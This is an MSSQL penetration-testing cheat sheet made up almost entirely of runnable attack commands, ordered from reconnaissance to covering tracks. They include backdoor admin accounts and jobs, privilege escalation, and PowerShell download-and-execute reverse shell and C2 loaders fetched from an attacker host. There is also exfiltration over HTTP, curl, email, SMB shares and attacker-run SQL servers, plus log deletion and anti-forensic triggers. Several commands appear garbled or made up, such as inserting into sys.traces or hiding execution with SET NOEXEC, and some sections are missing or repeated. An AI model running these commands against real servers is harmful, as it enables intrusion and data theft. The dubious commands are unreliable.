# Index
- [[Microsoft Active Directory (AD)]]
	- [[Active Directory Cheat Sheet]]
	- [[Kerberos Cheat Sheet]]
	- [[LDAP Cheat Sheet]]
	- [[MSSQL Cheat Sheet]]
	- [[PowerShell Active Directory Cheat Sheet]]

MSSQL Penetration Testing Cheat Sheet

## 1. External Reconnaissance

#### 1.1 Enumerate MSSQL Servers
- **nmap**:
  ```bash
  nmap -p 1433 --script ms-sql-info -v -oA mssql-enum <target_ip>
  ```
  This command enumerates MSSQL services running on port 1433 and gathers information using the `ms-sql-info` script.

- **SQLPing**:
  ```bash
  sqlping -v -t <target_ip>
  ```
  SQLPing can be used to detect MSSQL servers on the network by sending SQL Server resolution service requests.

#### 1.2 Enumerate MSSQL Information
- **sqlcmd (Linux)**:
  ```bash
  sqlcmd -S <target_ip> -U <username> -P <password> -Q "SELECT @@VERSION;"
  ```
  The command connects to the MSSQL server and retrieves the version information.

- **CrackMapExec (CME)**:
  ```bash
  cme mssql <target_ip> -u <username> -p <password> --mssql-info
  ```
  CME can be used to enumerate information about the MSSQL server, such as version, users, and databases.

#### 1.3 Enumerate MSSQL Databases and Users
- **sqlcmd (Linux)**:
  ```bash
  sqlcmd -S <target_ip> -U <username> -P <password> -Q "SELECT name FROM sys.databases;"
  ```
  This command lists all databases on the MSSQL server.

- **CrackMapExec (CME)**:
  ```bash
  cme mssql <target_ip> -u <username> -p <password> --mssql-databases
  ```
  Enumerate all databases on the MSSQL server using CME.

- **MSSQLClient.py (Impacket)**:
  ```bash
  mssqlclient.py <domain>/<username>:<password>@<target_ip>
  ```
  Connect to the MSSQL server and interactively enumerate databases, users, and other information.

#### 1.4 Enumerate MSSQL Roles and Permissions
- **sqlcmd (Linux)**:
  ```bash
  sqlcmd -S <target_ip> -U <username> -P <password> -Q "SELECT dp.name, dp.type_desc, p.permission_name FROM sys.database_permissions AS p JOIN sys.database_principals AS dp ON p.grantee_principal_id = dp.principal_id;"
  ```
  This command lists the roles and permissions assigned to users in the MSSQL databases.

- **CrackMapExec (CME)**:
  ```bash
  cme mssql <target_ip> -u <username> -p <password> --mssql-roles
  ```
  CME can also enumerate roles and permissions for the MSSQL server.

## 2. Initial Access

#### 2.1 MSSQL Brute Forcing
- **THC-Hydra**:
  ```bash
  hydra -L /path/to/usernames.txt -P /path/to/passwords.txt mssql://<target_ip>:1433
  ```
  Use THC-Hydra to brute force MSSQL credentials.

#### 2.2 Exploit XP_Cmdshell
- **SQLCMD (Linux)**:
  ```bash
  sqlcmd -S <target_ip> -U <username> -P <password> -Q "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;"
  ```
  This enables `xp_cmdshell` on the MSSQL server, allowing for command execution.

- **CrackMapExec (CME)**:
  ```bash
  cme mssql <target_ip> -u <username> -p <password> --xp_cmdshell "whoami"
  ```
  Use CME to execute commands via `xp_cmdshell`.

## 3. Persistence

#### 3.1 Create Backdoor Account
- **SQLCMD (Linux)**:
  ```bash
  sqlcmd -S <target_ip> -U <username> -P <password> -Q "CREATE LOGIN [attacker] WITH PASSWORD = 'P@ssw0rd'; CREATE USER [attacker] FOR LOGIN [attacker] WITH DEFAULT_SCHEMA=[dbo]; ALTER SERVER ROLE [sysadmin] ADD MEMBER [attacker];"
  ```
  Create a backdoor admin account on the MSSQL server for persistent access.

#### 3.2 Add Startup Job
- **SQLCMD (Linux)**:
  ```bash
  sqlcmd -S <target_ip> -U <username> -P <password> -Q "EXEC msdb.dbo.sp_add_job @job_name='Backdoor'; EXEC msdb.dbo.sp_add_jobstep @job_name='Backdoor', @step_name='CommandStep', @subsystem='CmdExec', @command='net user attacker P@ssw0rd /add', @on_success_action=1; EXEC msdb.dbo.sp_add_jobserver @job_name='Backdoor'; EXEC msdb.dbo.sp_start_job @job_name='Backdoor';"
  ```
  Create a scheduled job that runs a command each time the MSSQL server starts.

## 4. Credential Harvesting

#### 4.1 Dump MSSQL Password Hashes
- **CrackMapExec (CME)**:
  ```bash
  cme mssql <target_ip> -u <username> -p <password> --mssql-hashes
  ```
  Dump password hashes from the MSSQL server.

#### 4.2 Capture MSSQL Authentication
- **Responder**:
  ```bash
  responder -I <network_interface> -v
  ```
  Use Responder to capture MSSQL authentication requests on the network.

#### 4.3 Extract Credentials from SQL Server
- **MSSQLClient.py (Impacket)**:
  ```bash
  mssqlclient.py <domain>/<username>:<password>@<target_ip> -windows-auth
  ```
  Connect to the MSSQL server and attempt to extract stored credentials.

## 5. Privilege Escalation

#### 5.1 Escalate Privileges via SQL Injection
- **SQL Injection (Manual)**:
  ```c
  ' OR 1=1; EXEC sp_addsrvrolemember 'attacker', 'sysadmin'; --
  ```
  Exploit SQL injection vulnerabilities to add an attacker account to the `sysadmin` role.

#### 5.2 Escalate to Sysadmin Role
- **SQLCMD (Linux)**:
  ```bash
  sqlcmd -S <target_ip> -U <username> -P <password> -Q "ALTER SERVER ROLE [sysadmin] ADD MEMBER [attacker];"
  ```
  Use SQLCMD to escalate privileges to `sysadmin` on the MSSQL server.

## 6. Lateral Movement

#### 6.1 MSSQL Linked Servers
- **SQLCMD (Linux)**:
  ```bash
  sqlcmd -S <target_ip> -U <username> -P <password> -Q "SELECT name, data_source FROM sys.servers WHERE is_linked = 1;"
  ```
  Enumerate linked servers for potential lateral movement.

- **CrackMapExec (CME)**:
  ```bash
  cme mssql <target_ip> -u <username> -p <password> --linked-procs
  ```
  CME can also enumerate and exploit linked servers for lateral movement.

#### 6.2 Lateral Movement via SQLCMD
- **SQLCMD (Linux)**:
  ```bash
  sqlcmd -S <target_ip> -U <username> -P <password> -Q "EXEC ('xp_cmdshell ''net use Z: \\\\linked_server\\share /user:domain\\user password''') AT [linked_server];"
  ```
  Execute commands on a linked server to move laterally.

## 7. Defense Evasion

#### 7.1 Clear MSSQL Logs
- **SQLCMD (Linux)**:
  ```bash
  sqlcmd -S <target_ip> -U <username> -P <password> -Q "EXEC sp_cycle_errorlog;"
  ```
  Rotate the MSSQL error logs to evade detection.

#### 7.2 Disable Auditing
- **SQLCMD (Linux)**:
  ```bash
  sqlcmd -S <target_ip> -U <username> -P <password> -Q "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'c2 audit mode', 0; RECONFIGURE;"
  ```
  Disable C2 auditing on the MSSQL server to evade detection.

## 9. Internal Reconnaissance

#### 9.1 Enumerate SQL Server Configurations
- **SQLCMD (Linux)**:
  ```bash
  sqlcmd -S <target_ip> -U <username> -P <password> -Q "EXEC sp_configure;"
  ```
  List all SQL Server configurations and their current settings.

#### 9.2 Enumerate Running Processes
- **SQLCMD (Linux)**:
  ```bash
  sqlcmd -S <target_ip> -U <username> -P <password> -Q "EXEC xp_cmdshell 'tasklist';"
  ```
  Enumerate all running processes on the server by executing the `tasklist` command via `xp_cmdshell`.

#### 9.3 Enumerate Network Configuration
- **SQLCMD (Linux)**:
  ```bash
  sqlcmd -S <target_ip> -U <username> -P <password> -Q "EXEC xp_cmdshell 'ipconfig /all';"
  ```
  Enumerate detailed network configuration, including IP addresses and DNS settings.

#### 9.4 Enumerate Open Network Connections
- **SQLCMD (Linux)**:
  ```bash
  sqlcmd -S <target_ip> -U <username> -P <password> -Q "EXEC xp_cmdshell 'netstat -an';"
  ```
  List all active network connections to understand the communication landscape of the server.

#### 9.5 Identify Installed Software
- **SQLCMD (Linux)**:
  ```bash
  sqlcmd -S <target_ip> -U <username> -P <password> -Q "EXEC xp_cmdshell 'wmic product get name, version';"
  ```
  Enumerate all installed software, which may reveal vulnerable or misconfigured applications.

#### 9.6 Extract MSSQL Service Account Information
- **SQLCMD (Linux)**:
  ```bash
  sqlcmd -S <target_ip> -U <username> -P <password> -Q "SELECT service_account FROM sys.dm_server_services;"
  ```
  Identify the service account under which SQL Server is running, which can be useful for privilege escalation.

#### 9.7 Enumerate SQL Server Agent Jobs
- **SQLCMD (Linux)**:
  ```bash
  sqlcmd -S <target_ip> -U <username> -P <password> -Q "SELECT name, enabled, description FROM msdb.dbo.sysjobs;"
  ```
  List all SQL Server Agent jobs, including their descriptions and whether they are enabled.

## 10. Exploiting Linked Servers

#### 10.1 Exploit Linked Server Trust
- **SQLCMD (Linux)**:
  ```bash
  sqlcmd -S <target_ip> -U <username> -P <password> -Q "EXEC ('xp_cmdshell ''whoami''') AT [linked_server];"
  ```
  Exploit linked server trust by executing commands on the linked server.

#### 10.2 Impersonate a User on Linked Server
- **SQLCMD (Linux)**:
  ```bash
  sqlcmd -S <target_ip> -U <username> -P <password> -Q "EXECUTE AS LOGIN = 'sa'; EXEC ('xp_cmdshell ''whoami''') AT [linked_server];"
  ```
  Impersonate a high-privilege user on the linked server and execute commands.

#### 10.3 Enumerate Linked Server Logins
- **SQLCMD (Linux)**:
  ```bash
  sqlcmd -S <target_ip> -U <username> -P <password> -Q "SELECT name, is_disabled FROM sys.server_principals WHERE type = 'S';"
  ```
  List all SQL logins on the linked server, including their status (enabled/disabled).

## 11. Privilege Escalation Techniques

#### 11.1 Exploit SQL Server Misconfigurations
- **SQLCMD (Linux)**:
  ```bash
  sqlcmd -S <target_ip> -U <username> -P <password> -Q "EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;"
  ```
  If `xp_cmdshell` is disabled, enable it to execute system commands.

#### 11.2 Escalate Privileges via Database Roles
- **SQLCMD (Linux)**:
  ```bash
  sqlcmd -S <target_ip> -U <username> -P <password> -Q "EXEC sp_addsrvrolemember 'attacker', 'sysadmin';"
  ```
  Add the attacker account to the `sysadmin` role, thereby escalating privileges.

#### 11.3 Escalate to OS-level Administrator
- **SQLCMD (Linux)**:
  ```bash
  sqlcmd -S <target_ip> -U <username> -P <password> -Q "EXEC xp_cmdshell 'net localgroup administrators attacker /add';"
  ```
  Add the attacker to the OS-level `Administrators` group using `xp_cmdshell`.

#### 11.4 Token Impersonation via SQL Server
- **SQLCMD (Linux)**:
  ```bash
  sqlcmd -S <target_ip> -U <username> -P <password> -Q "EXEC xp_cmdshell 'whoami /priv';"
  ```
  Enumerate available tokens and privileges that can be impersonated on the server.

## 12. Advanced Lateral Movement

#### 12.1 Pivoting through MSSQL to Other Services
- **SQLCMD (Linux)**:
  ```bash
  sqlcmd -S <target_ip> -U <username> -P <password> -Q "EXEC xp_cmdshell 'net use Z: \\\\other_server\\share /user:domain\\user password';"
  ```
  Pivot through the MSSQL server to access file shares on other systems.

#### 12.2 Deploying a Reverse Shell via SQLCMD
- **SQLCMD (Linux)**:
  ```bash
  sqlcmd -S <target_ip> -U <username> -P <password> -Q "EXEC xp_cmdshell 'powershell -c IEX (New-Object Net.WebClient).DownloadString(''http://<attacker_ip>/reverse_shell.ps1'');';"
  ```
  Execute a reverse shell by leveraging `xp_cmdshell` and PowerShell.

#### 12.3 Use Linked Server for Data Exfiltration
- **SQLCMD (Linux)**:
  ```bash
  sqlcmd -S <target_ip> -U <username> -P <password> -Q "EXEC ('bcp ''SELECT * FROM sensitive_table'' queryout \\\\attacker_ip\\share\\sensitive_data.txt -c -T') AT [linked_server];"
  ```
  Use `bcp` (Bulk Copy Program) on a linked server to exfiltrate data to an attacker-controlled share.

## 13. Defense Evasion

#### 13.1 Obfuscate SQL Commands
- **SQLCMD (Linux)**:
  ```bash
  sqlcmd -S <target_ip> -U <username> -P <password> -Q "EXEC xp_cmdshell 'powershell -enc <Base64EncodedCommand>';"
  ```
  Encode PowerShell commands in Base64 to evade detection when executed via `xp_cmdshell`.

#### 13.2 Hide MSSQL Command Execution
- **SQLCMD (Linux)**:
  ```bash
  sqlcmd -S <target_ip> -U <username> -P <password> -Q "SET NOEXEC ON; EXEC xp_cmdshell 'whoami'; SET NOEXEC OFF;"
  ```
  Temporarily disable execution logging by using `SET NOEXEC ON` before running commands.

#### 13.3 Spoof MSSQL Logs
- **SQLCMD (Linux)**:
  ```bash
  sqlcmd -S <target_ip> -U <username> -P <password> -Q "EXEC sp_cycle_errorlog; INSERT INTO sys.traces (event, data) VALUES (4, 'Backup complete');"
  ```
  Manipulate SQL Server logs to insert misleading events, thereby confusing defenders.

#### 13.4 Disable SQL Server Alerts
- **SQLCMD (Linux)**:
  ```bash
  sqlcmd -S <target_ip> -U <username> -P <password> -Q "EXEC sp_add_alert @name = 'AttackAlert', @message_id = 50000, @enabled = 0;"
  ```
  Disable or modify SQL Server alerts that could notify administrators of suspicious activities.

## 14. Data Exfiltration

#### 14.1 Exfiltration via SQL Server Linked Servers
- **SQLCMD (Linux)**:
  ```bash
  sqlcmd -S <target_ip> -U <username> -P <password> -Q "EXEC ('xp_cmdshell ''copy C:\\SensitiveData.txt \\\\attacker_ip\\share\\SensitiveData.txt''') AT [linked_server];"
  ```
  Copy sensitive data from the SQL Server to an attacker-controlled share using linked servers.

#### 14.2 Data Exfiltration via HTTP Request
- **SQLCMD (Linux)**:
  ```bash
  sqlcmd -S <target_ip> -U <username> -P <password> -Q "EXEC xp_cmdshell 'powershell -c Invoke-WebRequest -Uri http://<attacker_ip>/upload -Method POST -Body (Get-Content C:\\SensitiveData.txt)';"
  ```
  Exfiltrate data by sending it via an HTTP POST request to an attacker-controlled server.

#### 14.3 Exfiltration via Email
- **SQLCMD (Linux)**:
  ```bash
  sqlcmd -S <target_ip> -U

 <username> -P <password> -Q "EXEC xp_cmdshell 'powershell -c Send-MailMessage -To attacker@domain.com -From sqlserver@domain.com -Subject \"Data Exfil\" -Body (Get-Content C:\\SensitiveData.txt) -SmtpServer smtp.domain.com';"
  ```
  Exfiltrate data by emailing it directly from the SQL Server.

## 15. Cleanup and Covering Tracks

#### 15.1 Remove Executed Commands from MSSQL Logs
- **SQLCMD (Linux)**:
  ```bash
  sqlcmd -S <target_ip> -U <username> -P <password> -Q "EXEC sp_cycle_errorlog;"
  ```
  Rotate the SQL Server error log to remove traces of executed commands.

#### 15.2 Delete Files and Artifacts
- **SQLCMD (Linux)**:
  ```bash
  sqlcmd -S <target_ip> -U <username> -P <password> -Q "EXEC xp_cmdshell 'del C:\\SensitiveData.txt';"
  ```
  Delete any files or artifacts that were created during the penetration test.

#### 15.3 Reset SQL Server Configurations
- **SQLCMD (Linux)**:
  ```bash
  sqlcmd -S <target_ip> -U <username> -P <password> -Q "EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE;"
  ```
  Reset SQL Server configurations to their original state after testing.

#### 15.4 Log Out and End Sessions
- **SQLCMD (Linux)**:
  ```bash
  sqlcmd -S <target_ip> -U <username> -P <password> -Q "KILL <session_id>;"
  ```
  Terminate any active SQL sessions that were created during the test.

## 16. Advanced Attack Techniques

#### 16.1 Command and Control via MSSQL
- **SQLCMD (Linux)**:
  ```bash
  sqlcmd -S <target_ip> -U <username> -P <password> -Q "EXEC xp_cmdshell 'powershell -c IEX (New-Object Net.WebClient).DownloadString(''http://<attacker_ip>/c2.ps1'');';"
  ```
  Set up a command and control channel using `xp_cmdshell` and PowerShell.

#### 16.2 Persistence via SQL Server Jobs
- **SQLCMD (Linux)**:
  ```bash
  sqlcmd -S <target_ip> -U <username> -P <password> -Q "EXEC msdb.dbo.sp_add_job @job_name='PersistentC2', @enabled=1, @description='Command and Control persistence'; EXEC msdb.dbo.sp_add_jobstep @job_name='PersistentC2', @step_name='CommandStep', @subsystem='CmdExec', @command='powershell -c IEX (New-Object Net.WebClient).DownloadString(''http://<attacker_ip>/c2.ps1'');'; EXEC msdb.dbo.sp_add_jobserver @job_name='PersistentC2'; EXEC msdb.dbo.sp_start_job @job_name='PersistentC2';"
  ```
  Create a persistent command and control mechanism via SQL Server Agent Jobs.

#### 16.3 Data Staging and Exfiltration via SQL Server
- **SQLCMD (Linux)**:
  ```bash
  sqlcmd -S <target_ip> -U <username> -P <password> -Q "CREATE TABLE #staging (data NVARCHAR(MAX)); BULK INSERT #staging FROM 'C:\\SensitiveData.txt'; INSERT INTO OPENROWSET('SQLNCLI', 'Server=<attacker_ip>;Uid=<username>;Pwd=<password>;', 'SELECT * FROM <database>.<schema>.<table>') SELECT * FROM #staging;"
  ```
  Stage and exfiltrate data by transferring it to an attacker-controlled SQL Server.

## 18. Advanced Exploitation Techniques

### 18.1 Leveraging CLR Assemblies for Exploitation
- **Deploying a Custom CLR Assembly**:
  ```bash
  sqlcmd -S <target_ip> -U <username> -P <password> -Q "CREATE ASSEMBLY myAssembly FROM 'C:\Path\To\Assembly.dll' WITH PERMISSION_SET = UNSAFE;"
  ```
  Deploy a custom Common Language Runtime (CLR) assembly to execute arbitrary code within the SQL Server environment.

- **Executing CLR Assembly Commands**:
  ```bash
  sqlcmd -S <target_ip> -U <username> -P <password> -Q "CREATE PROCEDURE execCmd(@cmd NVARCHAR(4000)) AS EXTERNAL NAME myAssembly.[Namespace.ClassName].MethodName;"
  sqlcmd -S <target_ip> -U <username> -P <password> -Q "EXEC execCmd 'whoami';"
  ```
  Execute commands through a deployed CLR assembly.

### 18.2 Exploiting SQL Server Extended Events
- **Creating Malicious Extended Events**:
  ```bash
  sqlcmd -S <target_ip> -U <username> -P <password> -Q "CREATE EVENT SESSION [maliciousSession] ON SERVER ADD EVENT sqlserver.module_end(SET collect_column = (object_id)) ADD TARGET package0.asynchronous_file_target(SET filename=N'C:\path\to\file.xel');"
  ```
  Create a malicious Extended Events session to capture and log sensitive data.

- **Starting the Extended Events Session**:
  ```bash
  sqlcmd -S <target_ip> -U <username> -P <password> -Q "ALTER EVENT SESSION [maliciousSession] ON SERVER STATE = START;"
  ```
  Start the malicious Extended Events session to begin data collection.

### 18.3 SQL Server Database Backdoor
- **Creating a Database-Level Trigger Backdoor**:
  ```bash
  sqlcmd -S <target_ip> -U <username> -P <password> -d <database> -Q "CREATE TRIGGER db_backdoor ON DATABASE FOR LOGON AS BEGIN EXECUTE AS LOGIN = 'sa'; EXEC xp_cmdshell 'net user attacker P@ssw0rd /add'; END;"
  ```
  Create a database-level trigger that executes a backdoor command whenever someone logs in.

- **Persistence via SQL Server User-defined Functions (UDFs)**:
  ```bash
  sqlcmd -S <target_ip> -U <username> -P <password> -Q "CREATE FUNCTION dbo.BackdoorFunc() RETURNS NVARCHAR(4000) AS BEGIN RETURN (SELECT 'net user attacker P@ssw0rd /add'); END;"
  ```
  Create a UDF that acts as a backdoor, executing commands whenever it's invoked.

## 19. Data Exfiltration Techniques

### 19.1 Exfiltration via HTTP Tunneling
- **SQLCMD (Linux)**:
  ```bash
  sqlcmd -S <target_ip> -U <username> -P <password> -Q "EXEC xp_cmdshell 'powershell -c Invoke-WebRequest -Uri http://<attacker_ip>/upload -Method POST -Body (Get-Content C:\\SensitiveData.txt)';"
  ```
  Exfiltrate data by tunneling through HTTP requests to an attacker-controlled server.

### 19.2 Exfiltration via Encrypted Channels
- **SQLCMD (Linux)**:
  ```bash
  sqlcmd -S <target_ip> -U <username> -P <password> -Q "EXEC xp_cmdshell 'openssl enc -aes-256-cbc -salt -in C:\\SensitiveData.txt -out C:\\SensitiveData.enc -pass pass:yourpassword';"
  ```
  Encrypt sensitive data before exfiltration to evade detection.

- **Transfer Encrypted Data**:
  ```bash
  sqlcmd -S <target_ip> -U <username> -P <password> -Q "EXEC xp_cmdshell 'curl -F file=@C:\\SensitiveData.enc http://<attacker_ip>/upload';"
  ```
  Transfer the encrypted data via a secure channel.

### 19.3 Exfiltration Using SQL Server Linked Servers
- **SQLCMD (Linux)**:
  ```bash
  sqlcmd -S <target_ip> -U <username> -P <password> -Q "INSERT INTO OPENROWSET('SQLNCLI', 'Server=<attacker_ip>;Uid=<username>;Pwd=<password>;', 'SELECT * FROM sensitive_data') SELECT * FROM local_sensitive_table;"
  ```
  Use linked servers to exfiltrate data from a local SQL Server to an attacker-controlled SQL Server.

### 19.4 Exfiltrating via Database Replication
- **Setting Up Malicious Replication**:
  ```bash
  sqlcmd -S <target_ip> -U <username> -P <password> -Q "EXEC sp_addlinkedserver @server='attacker_server', @srvproduct='', @provider='SQLNCLI', @datasrc='<attacker_ip>';"
  sqlcmd -S <target_ip> -U <username> -P <password> -Q "EXEC sp_addpublication @publication='MaliciousReplication', @article='sensitive_data', @article_type='TABLE', @source_object='sensitive_data_table';"
  ```
  Set up replication from a victim SQL Server to an attacker-controlled server.

- **Transferring Data via Replication**:
  ```bash
  sqlcmd -S <target_ip> -U <username> -P <password> -Q "EXEC sp_startpublication_snapshot @publication='MaliciousReplication';"
  ```
  Trigger the replication process to transfer sensitive data to the attacker’s server.

## 20. Advanced Privilege Escalation

### 20.1 Escalate Privileges Using Service Accounts
- **Identifying Weak Service Account Passwords**:
  ```bash
  sqlcmd -S <target_ip> -U <username> -P <password> -Q "EXEC xp_cmdshell 'powershell -c Get-Service | Where-Object {$_.StartType -eq ''Automatic'' -and $_.ServiceName -notlike ''*SQL*''}';"
  ```
  Identify and target weak service accounts running on the SQL Server.

- **Exploiting Service Accounts for Lateral Movement**:
  ```bash
  sqlcmd -S <target_ip> -U <username> -P <password> -Q "EXEC xp_cmdshell 'sc.exe config ServiceName binPath= ''cmd.exe /c net user attacker P@ssw0rd /add''';"
  ```
  Exploit service accounts to gain further privileges or move laterally within the network.

### 20.2 Abusing SQL Server Service Broker for Privilege Escalation
- **Creating a Service Broker Queue**:
  ```bash
  sqlcmd -S <target_ip> -U <username> -P <password> -Q "CREATE QUEUE attacker_queue;"
  ```
  Create a malicious queue that can be used to execute commands.

- **Sending Commands to the Queue**:
  ```bash
  sqlcmd -S <target_ip> -U <username> -P <password> -Q "SEND ON CONVERSATION CONVERSATION_HANDLE WITH MESSAGE TYPE [http://schemas.microsoft.com/SQL/ServiceBroker/EndDialog];"
  ```
  Execute commands via Service Broker by sending messages to the queue.

### 20.3 Exploiting SQL Server Security Features
- **Abusing SQL Server Audit**:
  ```bash
  sqlcmd -S <target_ip> -U <username> -P <password> -Q "CREATE SERVER AUDIT [MaliciousAudit] TO FILE (FILEPATH = 'C:\\Path\\To\\AuditFile'); ALTER SERVER AUDIT [MaliciousAudit] WITH (STATE = ON);"
  ```
  Create and abuse a server audit to capture sensitive actions and data.

- **Escalate Privileges via Trustworthy Database Property**:
  ```bash
  sqlcmd -S <target_ip> -U <username> -P <password> -d <database> -Q "ALTER DATABASE <database> SET TRUSTWORTHY ON;"
  sqlcmd -S <target_ip> -U <username> -P <password> -d <database> -Q "CREATE PROCEDURE escalate_privs AS EXECUTE AS LOGIN = 'sa'; EXEC sp_addsrvrolemember 'attacker', 'sysadmin';"
  sqlcmd -S <target_ip> -U <username> -P <password> -d <database> -Q "EXEC escalate_privs;"
  ```
  Use the `TRUSTWORTHY` database property to escalate privileges within SQL Server.

## 21. Anti-Forensics and Defense Evasion

### 21.1 Obfuscating SQL Server Queries
- **Using Dynamic SQL for Obfuscation**:
  ```bash
  sqlcmd -S <target_ip> -U <username> -P <password> -Q "DECLARE @cmd NVARCHAR(4000); SET @cmd = N'SELECT * FROM sensitive_table WHERE id = 1;'; EXEC sp_executesql @cmd;"
  ```
  Obfuscate queries by using dynamic SQL to evade detection by security monitoring systems.

### 21.2 Disabling Triggers and Constraints for Data Tampering
- **Disabling Triggers**:
  ```bash
  sqlcmd -S <target_ip> -U <username> -P <password> -Q "DISABLE TRIGGER ALL ON ALL SERVER;"
  ```
  Temporarily disable triggers to prevent logging or execution of actions

 that might raise alarms.

### 21.3 Deleting SQL Server Logs Programmatically
- **Deleting Specific Logs**:
  ```bash
  sqlcmd -S <target_ip> -U <username> -P <password> -Q "EXEC xp_cmdshell 'del C:\\Program Files\\Microsoft SQL Server\\MSSQL14.MSSQLSERVER\\MSSQL\\Log\\ERRORLOG';"
  ```
  Programmatically delete specific logs to cover tracks.

### 21.4 Manipulating SQL Server Wait Events
- **Simulating Wait Events to Create Noise**:
  ```bash
  sqlcmd -S <target_ip> -U <username> -P <password> -Q "WAITFOR DELAY '00:00:05';"
  ```
  Simulate wait events to create noise and obscure true actions from monitoring tools.

## 23. SQL Server Security Bypass Techniques

### 23.1 Bypassing Authentication via SQL Server Broker
- **Hijacking SQL Server Service Broker**:
  ```bash
  sqlcmd -S <target_ip> -U <username> -P <password> -Q "CREATE SERVICE [MaliciousService] ON QUEUE [dbo].[maliciousQueue] ([http://schemas.microsoft.com/SQL/ServiceBroker/DialogTimer]);"
  ```
  Bypass authentication by hijacking the SQL Server Service Broker for internal communication.

### 23.2 Bypassing Role-based Access Controls (RBAC)
- **Exploiting Misconfigured RBAC**:
  ```bash
  sqlcmd -S <target_ip> -U <username> -P <password> -Q "EXEC AS LOGIN = 'sa'; EXEC xp_cmdshell 'whoami';"
  ```
  Bypass role-based access controls by exploiting misconfigured RBAC and executing commands as a privileged user.

### 23.3 Abusing SQL Server Linked Server Configurations
- **Hijacking Linked Server Credentials**:
  ```bash
  sqlcmd -S <target_ip> -U <username> -P <password> -Q "EXEC sp_addlinkedserver @server='malicious', @srvproduct='', @provider='SQLNCLI', @datasrc='<attacker_ip>'; EXEC sp_addlinkedsrvlogin @rmtsrvname='malicious', @useself='false', @rmtuser='attacker', @rmtpassword='P@ssw0rd';"
  ```
  Bypass security controls by abusing linked server configurations to use malicious credentials.

### 23.4 Breaking Out of SQL Server Execution Context
- **Executing Code Outside SQL Server Context**:
  ```bash
  sqlcmd -S <target_ip> -U <username> -P <password> -Q "EXEC xp_cmdshell 'cmd.exe /c start calc.exe';"
  ```
  Break out of the SQL Server execution context by launching external processes.

## 24. SQL Server Forensics and Counter-forensics

### 24.1 Capturing Volatile Memory Artifacts
- **Dumping SQL Server Memory**:
  ```bash
  sqlcmd -S <target_ip> -U <username> -P <password> -Q "EXEC xp_cmdshell 'procdump -ma sqlservr.exe C:\\memory.dmp';"
  ```
  Capture volatile memory artifacts by dumping the SQL Server process memory.

### 24.2 Analyzing SQL Server Logs for Indicators of Compromise (IoCs)
- **Parsing SQL Server Logs for Suspicious Activity**:
  ```bash
  sqlcmd -S <target_ip> -U <username> -P <password> -Q "SELECT * FROM sys.fn_get_audit_file('C:\\SQL_Audit\\*.sqlaudit', DEFAULT, DEFAULT) WHERE action_id = 'LGIS';"
  ```
  Analyze SQL Server logs to identify indicators of compromise (IoCs) such as suspicious login activities.

### 24.3 Counter-forensic Techniques to Evade Detection
- **Obfuscating File Names and Paths**:
  ```bash
  sqlcmd -S <target_ip> -U <username> -P <password> -Q "EXEC xp_cmdshell 'ren C:\\SensitiveData.txt C:\\systemfile.tmp';"
  ```
  Obfuscate file names and paths to evade detection during forensic investigations.

### 24.4 Deploying Anti-forensic SQL Server Triggers
- **Creating Anti-forensic Triggers**:
  ```bash
  sqlcmd -S <target_ip> -U <username> -P <password> -Q "CREATE TRIGGER AntiForensicTrigger ON DATABASE FOR DELETE AS BEGIN IF EXISTS (SELECT * FROM DELETED WHERE username = 'investigator') BEGIN ROLLBACK; END END;"
  ```
  Deploy anti-forensic triggers that prevent certain forensic actions from being logged or executed.

### 24.5 Secure Log Management
- **Forwarding Logs to Secure Remote Server**:
  ```bash
  sqlcmd -S <target_ip> -U <username> -P <password> -Q "EXEC xp_cmdshell 'wevtutil qe Application /c:100 /f:text > \\\\secure_server\\share\\application_logs.txt';"
  ```
  Securely forward logs to a remote server to prevent tampering during investigations.

This extended and advanced MSSQL penetration testing cheat sheet provides a comprehensive arsenal of techniques and strategies for exploiting, evading detection, and securing SQL Server environments. These advanced methods address various aspects of penetration testing, including leveraging sophisticated exploitation techniques, data exfiltration, privilege escalation, anti-forensics, and forensic analysis, ensuring a thorough and in-depth approach to SQL Server security assessments.